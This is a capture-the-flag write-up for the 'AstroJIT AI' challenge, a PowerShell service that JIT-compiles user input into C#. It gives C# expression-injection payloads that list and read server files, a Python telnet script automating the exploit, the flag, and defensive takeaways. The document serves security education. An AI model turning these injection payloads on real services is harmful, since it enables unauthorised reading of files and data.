# AstroJIT AI CTF Writeup

## Challenge Summary
AstroJIT AI is a remote PowerShell application that JIT-compiles user-provided "weight" lists into C#. The service exposes a menu with options to register weights, chat with the AI, train on emails, inspect weights, and exit. Guest access skips the API token requirement, letting us interact with every menu item.

## Recon
- Submitting a simple payload like `{1,2,3}` to option 1 succeeds and returns to the menu.
- Feeding `{nan}` breaks compilation. PowerShell prints the generated C# source from `/app/evil_corp_ai.ps1`, confirming our input is spliced into `new[]{ ... }` within `CalculatePrecompiledWeights()`.
- The leaked source reveals only semicolons are stripped; otherwise, the payload becomes a raw C# expression evaluated inside the trusted app domain.

## Vulnerability
Because the service compiles our brace-delimited values directly into a C# array literal, we can supply arbitrary expressions. No sandboxing prevents filesystem access from within the compiled code, and the later "Weight Debugging" option echoes the evaluated results without the censorship logic that filters the chat bot output.

## Exploitation Steps
1. Connect in guest mode:
   ```bash
   nc astrojit.sunshinectf.games 25006
   ```
2. Choose option 1 (Register Weights) and submit a discovery payload, for example:
   ```
   {System.String.Join(",",System.IO.Directory.GetFiles("."))}
   ```
   This lists local files, revealing `flag.txt`.
3. Re-run option 1 with a read payload:
   ```
   {System.IO.File.ReadAllText("flag.txt")}
   ```
4. Choose option 4 (Weight Debugging). The service prints the stored weight for `a`, which now contains the flag.

## Automation Snippet
```python
import telnetlib

HOST, PORT = 'astrojit.sunshinectf.games', 25006

with telnetlib.Telnet(HOST, PORT) as t:
    t.read_until(b'use guest mode: ')
    t.write(b'\n')
    t.read_until(b'Enter an option: ')
    t.write(b'1\n')
    t.read_until(b'Weights: ')
    t.write(b'{System.IO.File.ReadAllText("flag.txt")}\n')
    t.read_until(b'Enter an option: ')
    t.write(b'4\n')
    print(t.read_until(b'Enter an option: ').decode())
```

## Flag
```
sun{evil-corp-one-uprising-at-a-time-folks-may-be-evil-but-do-not-get-burnt-out-just-burn-the-building-down-before-you-go-we-need-the-insurance-money}
```

## Takeaways
- Treat any user-controlled strings that reach `Add-Type` in PowerShell as code; expression-level sanitisation is mandatory.
- Attempted censorship applied only to chat responses, leaving other functionality (like weight debugging) as a clean data exfiltration channel.
- Even without semicolons, C# expressions provide ample surface for file I/O and other privileged actions when executed in-process.
